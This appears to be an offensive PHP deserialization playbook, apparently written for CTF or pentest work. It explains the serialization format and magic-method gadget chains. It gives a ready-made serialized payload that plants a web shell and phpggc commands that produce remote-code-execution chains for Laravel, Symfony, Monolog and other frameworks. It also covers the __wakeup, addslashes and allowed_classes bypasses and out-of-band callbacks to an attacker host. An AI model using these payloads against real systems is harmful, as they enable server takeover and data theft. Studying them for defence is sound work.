# PHP Deserialization — the full field manual

## The grammar — read the stream by hand first

```
O:<namelen>:"<classname>":<propcount>:{<props>}
a:<count>:{<k0><v0><k1><v1>...}
s:<len>:"<bytes>";
S:<len>:"<bytes with \xNN escapes>";   # escaped-string type, 5.1+
i:<int>;   b:<0|1>;   N;   d:<float>;
R:<ref>;   r:<ref>;                    # reference back to earlier slot
C:<len>:"<Serializable-class>":<datalen>:{<opaque>}
```

Worked example:
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

Property-name visibility encoding — the bytes actually matter:

```
s:4:"name"         → public prop
s:9:"\0*\0name"    → protected prop (prefix \0*\0)
s:10:"\0User\0x"   → private prop of class User (prefix \0CLASS\0)
```

This is the #1 hand-crafting failure: private/protected names carry NUL
bytes. `tools/php_ser_gen.py --spec` emits them correctly; hand JSON will not.

## Magic-method firing table — what actually runs your chain

| Method | Fires when | Classic use |
|---|---|---|
| `__wakeup()` | unserialize() completes | first instruction executed — reset/log/close |
| `__destruct()` | object is GC'd at end of unserialize() | file write, unlink, logger flush |
| `__toString()` | object used as string (echo, concat, strlen, strtolower, sprintf %s) | SQL, file read, method call |
| `__get($p)` | missing property read | pivot to another object's method |
| `__set($p,$v)` | missing property written | write primitive |
| `__call($m,$a)` | missing method called | invoke arbitrary named method |
| `__invoke()` | object used as function | `call_user_func` trampoline |
| `__isset/__unset` | isset/unset on missing prop | rare |
| `__sleep/__serialize` | serialize() (outbound) | rarely attacker-relevant |
| `__unserialize($d)` | PHP 7.4+ — replaces __wakeup for new classes | same role |

The engine order matters: `unserialize()` instantiates properties, then calls
`__wakeup()` on each object, then at end-of-request `__destruct()` runs in
creation order (or reverse). A chain whose sink needs `__destruct` always
fires — `__wakeup` can be suppressed by a length lie (below).

## The `__wakeup` suppression trick (CVE-2016-7124 shape)

```
O:4:"User":3:{...only 2 real props...}
```

Declares 3 properties but supplies 2 → PHP < 5.6.25 / < 7.0.10 skips
`__wakeup()` entirely. Chain starts at `__destruct` instead. Always try when
a `__wakeup` sanity-check resets your crafted props.

## POP-chain anatomy — entry → gadget → sink

```php
// ENTRY — the magic method that fires on your object
class Logger {
    protected $handler;
    function __destruct() { $this->handler->close(); }   // call into prop
}
// GADGET — a class whose methods do something useful
class FileHandler {
    protected $file; protected $data;
    function close() { file_put_contents($this->file, $this->data); }
}
// SINK — file write
```

Serialized:
```
O:6:"Logger":1:{s:10:"\0*\0handler";O:11:"FileHandler":2:{s:6:"\0*\0file";s:12:"/tmp/pwn.php";s:6:"\0*\0data";s:29:"<?php system($_GET['c']);?>";}}
```

The `\0*\0` prefixes are real bytes — that is why `php_ser_gen.py --spec`
exists. Hand-building this string is the classic failure.

## Building the payload — the sanctioned path

```bash
# literal object spec → correctly-typed, correctly-prefixed bytes
python3 tools/php_ser_gen.py \
  --spec '{"O":"Logger","props":{"handler":{"O":"FileHandler","props":{"file":"/tmp/x.php","data":"<?=`id`"}}}}}'

# one literal string, escaped-type variant for addslashes bypass
python3 tools/php_ser_gen.py --str 'value' --str-type S
```

`{"O":cls,"props":{...}}` is the object shorthand; nested objects nest the
same shape; `{"S":"raw"}` forces the `S:` hex-escape type.

## The `S:` escaped-string type — the addslashes/`'` filter bypass

`s:` can't carry a literal NUL byte through a `addslashes()`/`'` filter —
they break the grammar. `S:` hex-escapes every byte:

```
S:5:"\00\00\00\00\00";   → 5 raw NUL bytes, no real NUL in the stream
```

PHP ≥5.1 decodes `\xNN` in `S:` strings. Use it whenever a quote or NUL
would be mangled in transit (cookie encoding, `stripslashes` pairs, WAF).

## phpggc — the gadget generator

```bash
phpggc -l                              # ~100 chains, grouped by package
phpggc -i Guzzle/RCE1                  # what the chain does + version range
phpggc Guzzle/RCE1 system 'id'
phpggc Laravel/RCE5 system 'id' -b     # -b → base64 wrap
phpggc Symfony/RCE4 system 'id' -u     # -u → URL-encoded
phpggc Monolog/RCE1 system 'id' -s     # -s → fast destruct (skip wakeup semantics)
```

Common chain families (phpgcc names, not library names):

```
Guzzle/RCE1        Doctrine/RCE1-2     Laravel/RCE1-10
Monolog/RCE1-7     Symfony/RCE1-11     Slim/RCE1
SwiftMailer/FW1-3  TCPDF/FW1           ThinkPHP/FW1-2, RCE1
Yii/RCE1           ZendFramework/RCE1-4, FD1   WordPress/*
Magento/FW1-2      Drupal7/RCE1, FD1   Phalcon/RCE1   CodeIgniter4/RCE1-2
```

Chain types: `RCE` (calls function), `FW` (file write), `FD` (file delete),
`FR` (file read), `CMD` (command via proc_open etc).

## phar:// deserialization — file-ops trigger, no `unserialize()` needed

`phar://x.phar/some` reads the archive's **metadata block** through
`unserialize()` — triggered by `file_exists()`, `is_dir()`, `fopen()`,
`file_get_contents()`, `getimagesize()`, `mime_content_type()` — ANY file-op,
not just explicit unserialize. See `phar-deser.md` for the full module.

## Framework fingerprint → chain guess

| Signal in source/headers | Likely chain family |
|---|---|
| `monolog/monolog` in composer.json | Monolog/RCE* |
| `guzzlehttp/guzzle` + cookies jar | Guzzle/RCE1 |
| `laravel/framework` | Laravel/RCE*, App\{Model} |
| `symfony/` + `FOS` bundles | Symfony/RCE* |
| `swiftmailer` | SwiftMailer/FW* |
| WordPress + `Requests` + plugins | WordPress/* |
| `composer.lock` pinned version | pick the chain whose version range covers it |

## The `allowed_classes` filter (PHP ≥7.0)

```php
unserialize($x, ['allowed_classes' => ['User','Session']]);   // only these
unserialize($x, ['allowed_classes' => false]);                // none — O: refused
```

Objects outside the list deserialize as `__PHP_Incomplete_Class` — magic
methods do NOT fire. Bypass surface: an `allowed_classes` entry that itself
has a magic method, or a chain built on array/scalar types (still allowed).
If the source shows `allowed_classes=>false` and no other sink — the class
is dead, escalate to phar or a stored-object channel.

## SOAP extension — the OOB confirm without gadgets

```php
// SoapClient's __call() fetches a WSDL — it's a URL-fetch magic method.
// If SoapClient is in allowed_classes (or unfiltered unserialize):
$u = unserialize($_GET['x']);   // or via POP → SoapClient->__call
```

Chain: craft a POP whose `__wakeup`/`__destruct` calls `$obj->nonexist()`
where `$obj` is a `SoapClient` pointed at `http://YOU/wsdl` — the server
fetches it. OOB hit confirms the sink without needing RCE.

## OOB-detection recipes

- `unserialize()` + `assert()`/`preg_replace /e` in the chain → `curl YOU` via payload
- phar:// + `file_exists($p)` where `$p` is `phar://your.host/x` — DNS+SMB fetch
- SoapClient `__call` → remote WSDL fetch
- `SplFileObject` with remote URL in a `__toString` → URL fetch on echo

## Falsifiers

- `unserialize($x, ['allowed_classes'=>false])` and no other file-op reaches
  the value → class closed.
- Value is validated `ctype_`/regex before unserialize and your bytes can't
  pass → closed unless the validator has a gap.
- Session uses `session.serialize_handler=php_serialize` but you can't
  control the stored value → stored-channel falsifier.

## Output to record

- The format path (unserialize / phar file-op / session handler)
- The magic-method entry the chain hangs on
- The exact gadget (phpggc chain name + command form)
- The verbatim response excerpt carrying the flag or the RCE output
